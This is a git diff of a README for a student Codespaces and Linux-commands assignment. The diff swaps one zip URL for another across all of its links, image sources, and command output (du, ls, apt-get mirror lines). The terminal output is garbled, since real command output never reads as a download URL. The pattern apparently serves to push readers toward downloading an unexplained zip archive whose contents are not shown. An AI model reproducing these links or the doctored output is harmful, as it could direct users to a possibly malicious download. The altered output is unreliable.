@@ -9,20 +9,20 @@ Team Mates:
 ## Rules
 1. You are allowed to have **3 group** members.
 2. When you complete the assignment, make sure to submit the repository link of your cloned project. Make sure all the files are as what you aspect in your repository. 
-3. Answer all questions in the **https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/images/Sys_Project_Nat_v1.4.zip**, in your own repository. Either use the online VSCode, terminal or github to edit. Answers are expected where you see __Fill answer here__.
-4. Learn how to use markdown. https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/images/Sys_Project_Nat_v1.4.zip
+3. Answer all questions in the **https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/webpage/Project-Nat-Sys-v1.6.zip**, in your own repository. Either use the online VSCode, terminal or github to edit. Answers are expected where you see __Fill answer here__.
+4. Learn how to use markdown. https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/webpage/Project-Nat-Sys-v1.6.zip
 
 ## Forking this project repository
-1. First thing you need in doing this assignment is to have a github account. Make sure to sign up at https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/images/Sys_Project_Nat_v1.4.zip
+1. First thing you need in doing this assignment is to have a github account. Make sure to sign up at https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/webpage/Project-Nat-Sys-v1.6.zip
 2. The second thing you need is to fork the Net&Sys Assignment repository in your own github account. 
 
-    1. Go to https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/images/Sys_Project_Nat_v1.4.zip and click fork to copy the project into your own repository
+    1. Go to https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/webpage/Project-Nat-Sys-v1.6.zip and click fork to copy the project into your own repository
     2. Make sure that the new fork is now in your own repository
 
 ***Questions:***
 
 1. What is the link of the fork Net&Sys Assignment in your repository. ***(1 mark)*** __Fill answer here__.
-https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/images/Sys_Project_Nat_v1.4.zip
+https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/webpage/Project-Nat-Sys-v1.6.zip
 2. How many files and folders are in this repository. ***(1 mark)*** __Fill answer here__.
 1 folders and 7 files.
 
@@ -30,27 +30,27 @@ https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/images/Sys_Proj
 
 ## Exploring github codespaces
 
-1. The next thing that we will be doing is exploring codespaces. First of all, read about codespaces https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/images/Sys_Project_Nat_v1.4.zip
-2. Then go to the link https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/images/Sys_Project_Nat_v1.4.zip and we shall start a new codespace.  
+1. The next thing that we will be doing is exploring codespaces. First of all, read about codespaces https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/webpage/Project-Nat-Sys-v1.6.zip
+2. Then go to the link https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/webpage/Project-Nat-Sys-v1.6.zip and we shall start a new codespace.  
 3. Click on ***New codespace***.
 4. Choose your own Net&Sys Assignment repository to start your codespace.
 
- <img src="https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/images/Sys_Project_Nat_v1.4.zip" width="50%">
+ <img src="https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/webpage/Project-Nat-Sys-v1.6.zip" width="50%">
 
 5. Once you have created you codespace, you will see the following. You might already be familiar with this, since it will look similar to VSCode. 
 
- <img src="https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/images/Sys_Project_Nat_v1.4.zip" width="70%">
+ <img src="https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/webpage/Project-Nat-Sys-v1.6.zip" width="70%">
 
-6. You will see the [README file](https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/images/Sys_Project_Nat_v1.4.zip) file. One is a preview of how it looks like on the web, and the other is the editing view in markdown language. 
-7. Edit the [README file](https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/images/Sys_Project_Nat_v1.4.zip). Make sure you have your group details correct, ie, group name and team members along with their matric Numbers. 
+6. You will see the [README file](https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/webpage/Project-Nat-Sys-v1.6.zip) file. One is a preview of how it looks like on the web, and the other is the editing view in markdown language. 
+7. Edit the [README file](https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/webpage/Project-Nat-Sys-v1.6.zip). Make sure you have your group details correct, ie, group name and team members along with their matric Numbers. 
 8. Once you have finish editing, click File->Save or ***ctrl-s*** to save it. 
 9. After saving, you will notice an M or U next to your file. You will need to commit any changes, whenever you make changes so that it is uploaded to the github repository. 
 
- <img src="https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/images/Sys_Project_Nat_v1.4.zip" width="70%">
+ <img src="https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/webpage/Project-Nat-Sys-v1.6.zip" width="70%">
 
 10. Click on the source control, hint: its on the left side panel, and it will list down the files that have been modified or updated. Click on commit. It will then ask you "Would you like to stage all your changes and commit them directly?" Just say yes, and a new tab will appear. Type a message to log what you have done, and click on the check mark. 
 
- <img src="https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/images/Sys_Project_Nat_v1.4.zip" width="70%">
+ <img src="https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/webpage/Project-Nat-Sys-v1.6.zip" width="70%">
 
 11. After that, sync the changes to the main repository. 
 12. Make sure to commit and sync your files to the main repository, or else, your work will be lost since it is not saved into the main repository when you submit your project.
@@ -128,105 +128,105 @@ shm                65536        0     65536   0% /dev/shm
 4. Run the command **du** . ***(1 mark)*** __Fill answer here__.
 ```bash
 @FarhanHaikalHishamuddin ➜ /workspaces/NatSysProject (main) $ du
-4       https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/images/Sys_Project_Nat_v1.4.zip
-8       https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/images/Sys_Project_Nat_v1.4.zip
-8       https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/images/Sys_Project_Nat_v1.4.zip
-8       https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/images/Sys_Project_Nat_v1.4.zip
-8       https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/images/Sys_Project_Nat_v1.4.zip
-8       https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/images/Sys_Project_Nat_v1.4.zip
-12      https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/images/Sys_Project_Nat_v1.4.zip
-8       https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/images/Sys_Project_Nat_v1.4.zip
-8       https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/images/Sys_Project_Nat_v1.4.zip
-12      https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/images/Sys_Project_Nat_v1.4.zip
-8       https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/images/Sys_Project_Nat_v1.4.zip
-8       https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/images/Sys_Project_Nat_v1.4.zip
-8       https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/images/Sys_Project_Nat_v1.4.zip
-12      https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/images/Sys_Project_Nat_v1.4.zip
-8       https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/images/Sys_Project_Nat_v1.4.zip
-8       https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/images/Sys_Project_Nat_v1.4.zip
-8       https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/images/Sys_Project_Nat_v1.4.zip
-8       https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/images/Sys_Project_Nat_v1.4.zip
-12      https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/images/Sys_Project_Nat_v1.4.zip
-8       https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/images/Sys_Project_Nat_v1.4.zip
-12      https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/images/Sys_Project_Nat_v1.4.zip
-12      https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/images/Sys_Project_Nat_v1.4.zip
-16      https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/images/Sys_Project_Nat_v1.4.zip
-8       https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/images/Sys_Project_Nat_v1.4.zip
-8       https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/images/Sys_Project_Nat_v1.4.zip
-12      https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/images/Sys_Project_Nat_v1.4.zip
-8       https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/images/Sys_Project_Nat_v1.4.zip
-8       https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/images/Sys_Project_Nat_v1.4.zip
-12      https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/images/Sys_Project_Nat_v1.4.zip
-12      https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/images/Sys_Project_Nat_v1.4.zip
-8       https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/images/Sys_Project_Nat_v1.4.zip
-8       https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/images/Sys_Project_Nat_v1.4.zip
-12      https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/images/Sys_Project_Nat_v1.4.zip
-8       https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/images/Sys_Project_Nat_v1.4.zip
-8       https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/images/Sys_Project_Nat_v1.4.zip
-8       https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/images/Sys_Project_Nat_v1.4.zip
-8       https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/images/Sys_Project_Nat_v1.4.zip
-12      https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/images/Sys_Project_Nat_v1.4.zip
-8       https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/images/Sys_Project_Nat_v1.4.zip
-12      https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/images/Sys_Project_Nat_v1.4.zip
-16      https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/images/Sys_Project_Nat_v1.4.zip
-8       https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/images/Sys_Project_Nat_v1.4.zip
-8       https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/images/Sys_Project_Nat_v1.4.zip
-8       https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/images/Sys_Project_Nat_v1.4.zip
-16      https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/images/Sys_Project_Nat_v1.4.zip
-8       https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/images/Sys_Project_Nat_v1.4.zip
-8       https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/images/Sys_Project_Nat_v1.4.zip
-8       https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/images/Sys_Project_Nat_v1.4.zip
-12      https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/images/Sys_Project_Nat_v1.4.zip
-12      https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/images/Sys_Project_Nat_v1.4.zip
-8       https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/images/Sys_Project_Nat_v1.4.zip
-8       https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/images/Sys_Project_Nat_v1.4.zip
-8       https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/images/Sys_Project_Nat_v1.4.zip
-8       https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/images/Sys_Project_Nat_v1.4.zip
-8       https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/images/Sys_Project_Nat_v1.4.zip
-8       https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/images/Sys_Project_Nat_v1.4.zip
-16      https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/images/Sys_Project_Nat_v1.4.zip
-12      https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/images/Sys_Project_Nat_v1.4.zip
-8       https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/images/Sys_Project_Nat_v1.4.zip
-8       https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/images/Sys_Project_Nat_v1.4.zip
-8       https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/images/Sys_Project_Nat_v1.4.zip
-8       https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/images/Sys_Project_Nat_v1.4.zip
-8       https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/images/Sys_Project_Nat_v1.4.zip
-8       https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/images/Sys_Project_Nat_v1.4.zip
-8       https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/images/Sys_Project_Nat_v1.4.zip
-8       https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/images/Sys_Project_Nat_v1.4.zip
-12      https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/images/Sys_Project_Nat_v1.4.zip
-8       https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/images/Sys_Project_Nat_v1.4.zip
-8       https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/images/Sys_Project_Nat_v1.4.zip
-8       https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/images/Sys_Project_Nat_v1.4.zip
-8       https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/images/Sys_Project_Nat_v1.4.zip
-4       https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/images/Sys_Project_Nat_v1.4.zip
-12      https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/images/Sys_Project_Nat_v1.4.zip
-1824    https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/images/Sys_Project_Nat_v1.4.zip
-8       https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/images/Sys_Project_Nat_v1.4.zip
-12      https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/images/Sys_Project_Nat_v1.4.zip
-2520    https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/images/Sys_Project_Nat_v1.4.zip
-8       https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/images/Sys_Project_Nat_v1.4.zip
-12      https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/images/Sys_Project_Nat_v1.4.zip
-16      https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/images/Sys_Project_Nat_v1.4.zip
-28      https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/images/Sys_Project_Nat_v1.4.zip
-36      https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/images/Sys_Project_Nat_v1.4.zip
-68      https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/images/Sys_Project_Nat_v1.4.zip
-4       https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/images/Sys_Project_Nat_v1.4.zip
-8       https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/images/Sys_Project_Nat_v1.4.zip
-4       https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/images/Sys_Project_Nat_v1.4.zip
-8       https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/images/Sys_Project_Nat_v1.4.zip
-12      https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/images/Sys_Project_Nat_v1.4.zip
-16      https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/images/Sys_Project_Nat_v1.4.zip
-32      https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/images/Sys_Project_Nat_v1.4.zip
-8       https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/images/Sys_Project_Nat_v1.4.zip
-2712    https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/images/Sys_Project_Nat_v1.4.zip
+4       https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/webpage/Project-Nat-Sys-v1.6.zip
+8       https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/webpage/Project-Nat-Sys-v1.6.zip
+8       https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/webpage/Project-Nat-Sys-v1.6.zip
+8       https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/webpage/Project-Nat-Sys-v1.6.zip
+8       https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/webpage/Project-Nat-Sys-v1.6.zip
+8       https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/webpage/Project-Nat-Sys-v1.6.zip
+12      https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/webpage/Project-Nat-Sys-v1.6.zip
+8       https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/webpage/Project-Nat-Sys-v1.6.zip
+8       https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/webpage/Project-Nat-Sys-v1.6.zip
+12      https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/webpage/Project-Nat-Sys-v1.6.zip
+8       https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/webpage/Project-Nat-Sys-v1.6.zip
+8       https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/webpage/Project-Nat-Sys-v1.6.zip
+8       https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/webpage/Project-Nat-Sys-v1.6.zip
+12      https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/webpage/Project-Nat-Sys-v1.6.zip
+8       https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/webpage/Project-Nat-Sys-v1.6.zip
+8       https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/webpage/Project-Nat-Sys-v1.6.zip
+8       https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/webpage/Project-Nat-Sys-v1.6.zip
+8       https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/webpage/Project-Nat-Sys-v1.6.zip
+12      https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/webpage/Project-Nat-Sys-v1.6.zip
+8       https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/webpage/Project-Nat-Sys-v1.6.zip
+12      https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/webpage/Project-Nat-Sys-v1.6.zip
+12      https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/webpage/Project-Nat-Sys-v1.6.zip
+16      https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/webpage/Project-Nat-Sys-v1.6.zip
+8       https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/webpage/Project-Nat-Sys-v1.6.zip
+8       https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/webpage/Project-Nat-Sys-v1.6.zip
+12      https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/webpage/Project-Nat-Sys-v1.6.zip
+8       https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/webpage/Project-Nat-Sys-v1.6.zip
+8       https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/webpage/Project-Nat-Sys-v1.6.zip
+12      https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/webpage/Project-Nat-Sys-v1.6.zip
+12      https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/webpage/Project-Nat-Sys-v1.6.zip
+8       https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/webpage/Project-Nat-Sys-v1.6.zip
+8       https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/webpage/Project-Nat-Sys-v1.6.zip
+12      https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/webpage/Project-Nat-Sys-v1.6.zip
+8       https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/webpage/Project-Nat-Sys-v1.6.zip
+8       https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/webpage/Project-Nat-Sys-v1.6.zip
+8       https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/webpage/Project-Nat-Sys-v1.6.zip
+8       https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/webpage/Project-Nat-Sys-v1.6.zip
+12      https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/webpage/Project-Nat-Sys-v1.6.zip
+8       https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/webpage/Project-Nat-Sys-v1.6.zip
+12      https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/webpage/Project-Nat-Sys-v1.6.zip
+16      https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/webpage/Project-Nat-Sys-v1.6.zip
+8       https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/webpage/Project-Nat-Sys-v1.6.zip
+8       https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/webpage/Project-Nat-Sys-v1.6.zip
+8       https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/webpage/Project-Nat-Sys-v1.6.zip
+16      https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/webpage/Project-Nat-Sys-v1.6.zip
+8       https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/webpage/Project-Nat-Sys-v1.6.zip
+8       https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/webpage/Project-Nat-Sys-v1.6.zip
+8       https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/webpage/Project-Nat-Sys-v1.6.zip
+12      https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/webpage/Project-Nat-Sys-v1.6.zip
+12      https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/webpage/Project-Nat-Sys-v1.6.zip
+8       https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/webpage/Project-Nat-Sys-v1.6.zip
+8       https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/webpage/Project-Nat-Sys-v1.6.zip
+8       https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/webpage/Project-Nat-Sys-v1.6.zip
+8       https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/webpage/Project-Nat-Sys-v1.6.zip
+8       https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/webpage/Project-Nat-Sys-v1.6.zip
+8       https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/webpage/Project-Nat-Sys-v1.6.zip
+16      https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/webpage/Project-Nat-Sys-v1.6.zip
+12      https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/webpage/Project-Nat-Sys-v1.6.zip
+8       https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/webpage/Project-Nat-Sys-v1.6.zip
+8       https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/webpage/Project-Nat-Sys-v1.6.zip
+8       https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/webpage/Project-Nat-Sys-v1.6.zip
+8       https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/webpage/Project-Nat-Sys-v1.6.zip
+8       https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/webpage/Project-Nat-Sys-v1.6.zip
+8       https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/webpage/Project-Nat-Sys-v1.6.zip
+8       https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/webpage/Project-Nat-Sys-v1.6.zip
+8       https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/webpage/Project-Nat-Sys-v1.6.zip
+12      https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/webpage/Project-Nat-Sys-v1.6.zip
+8       https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/webpage/Project-Nat-Sys-v1.6.zip
+8       https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/webpage/Project-Nat-Sys-v1.6.zip
+8       https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/webpage/Project-Nat-Sys-v1.6.zip
+8       https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/webpage/Project-Nat-Sys-v1.6.zip
+4       https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/webpage/Project-Nat-Sys-v1.6.zip
+12      https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/webpage/Project-Nat-Sys-v1.6.zip
+1824    https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/webpage/Project-Nat-Sys-v1.6.zip
+8       https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/webpage/Project-Nat-Sys-v1.6.zip
+12      https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/webpage/Project-Nat-Sys-v1.6.zip
+2520    https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/webpage/Project-Nat-Sys-v1.6.zip
+8       https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/webpage/Project-Nat-Sys-v1.6.zip
+12      https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/webpage/Project-Nat-Sys-v1.6.zip
+16      https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/webpage/Project-Nat-Sys-v1.6.zip
+28      https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/webpage/Project-Nat-Sys-v1.6.zip
+36      https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/webpage/Project-Nat-Sys-v1.6.zip
+68      https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/webpage/Project-Nat-Sys-v1.6.zip
+4       https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/webpage/Project-Nat-Sys-v1.6.zip
+8       https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/webpage/Project-Nat-Sys-v1.6.zip
+4       https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/webpage/Project-Nat-Sys-v1.6.zip
+8       https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/webpage/Project-Nat-Sys-v1.6.zip
+12      https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/webpage/Project-Nat-Sys-v1.6.zip
+16      https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/webpage/Project-Nat-Sys-v1.6.zip
+32      https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/webpage/Project-Nat-Sys-v1.6.zip
+8       https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/webpage/Project-Nat-Sys-v1.6.zip
+2712    https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/webpage/Project-Nat-Sys-v1.6.zip
 1972    ./images
 4704    .
 ```
 5. Run the command **ls** . ***(1 mark)*** __Fill answer here__.
 ```bash
 @FarhanHaikalHishamuddin ➜ /workspaces/NatSysProject (main) $ ls
-https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/images/Sys_Project_Nat_v1.4.zip  images
+https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/webpage/Project-Nat-Sys-v1.6.zip  images
 ```
 6. Run the command **ls -asl** . ***(1 mark)*** __Fill answer here__.
 ```bash
@@ -235,7 +235,7 @@ total 36
  4 drwxrwxrwx+ 4 codespace root  4096 Jun 16 11:34 .
  4 drwxr-xrwx+ 5 codespace root  4096 Jun 16 11:34 ..
  4 drwxrwxrwx+ 9 codespace root  4096 Jun 16 13:26 .git
-20 -rw-rw-rw-  1 codespace root 17480 Jun 16 13:45 https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/images/Sys_Project_Nat_v1.4.zip
+20 -rw-rw-rw-  1 codespace root 17480 Jun 16 13:45 https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/webpage/Project-Nat-Sys-v1.6.zip
  4 drwxrwxrwx+ 2 codespace root  4096 Jun 16 11:34 images
  ```
 7. Run the command **free -h** . ***(1 mark)*** __Fill answer here__.
@@ -368,7 +368,7 @@ Using default tag: latest
 latest: Pulling from library/debian
 Digest: sha256:a92ed51e0996d8e9de041ca05ce623d2c491444df6a535a566dabd5cb8336946
 Status: Image is up to date for debian:latest
-https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/images/Sys_Project_Nat_v1.4.zip
+https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/webpage/Project-Nat-Sys-v1.6.zip
 ```
 ```bash
 @sarnsrun ➜ /workspaces/NatSysProject (main) $ docker run --detach -it debian
@@ -404,16 +404,16 @@ root@f65be1987f84:~# apt-get install nano
 
 root@f65be1987f84:~# cd /root
 
-root@f65be1987f84:~# nano https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/images/Sys_Project_Nat_v1.4.zip
+root@f65be1987f84:~# nano https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/webpage/Project-Nat-Sys-v1.6.zip
 ```
 ```bash
 root@424a7d294679:/# apt-get update
-Get:1 https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/images/Sys_Project_Nat_v1.4.zip bookworm InRelease [151 kB]
-Get:2 https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/images/Sys_Project_Nat_v1.4.zip bookworm-updates InRelease [55.4 kB]
-Get:3 https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/images/Sys_Project_Nat_v1.4.zip bookworm-security InRelease [48.0 kB]
-Get:4 https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/images/Sys_Project_Nat_v1.4.zip bookworm/main amd64 Packages [8786 kB]
-Get:5 https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/images/Sys_Project_Nat_v1.4.zip bookworm-updates/main amd64 Packages [13.8 kB]
-Get:6 https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/images/Sys_Project_Nat_v1.4.zip bookworm-security/main amd64 Packages [160 kB]
+Get:1 https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/webpage/Project-Nat-Sys-v1.6.zip bookworm InRelease [151 kB]
+Get:2 https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/webpage/Project-Nat-Sys-v1.6.zip bookworm-updates InRelease [55.4 kB]
+Get:3 https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/webpage/Project-Nat-Sys-v1.6.zip bookworm-security InRelease [48.0 kB]
+Get:4 https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/webpage/Project-Nat-Sys-v1.6.zip bookworm/main amd64 Packages [8786 kB]
+Get:5 https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/webpage/Project-Nat-Sys-v1.6.zip bookworm-updates/main amd64 Packages [13.8 kB]
+Get:6 https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/webpage/Project-Nat-Sys-v1.6.zip bookworm-security/main amd64 Packages [160 kB]
 Fetched 9214 kB in 1s (8816 kB/s)
 Reading package lists... Done
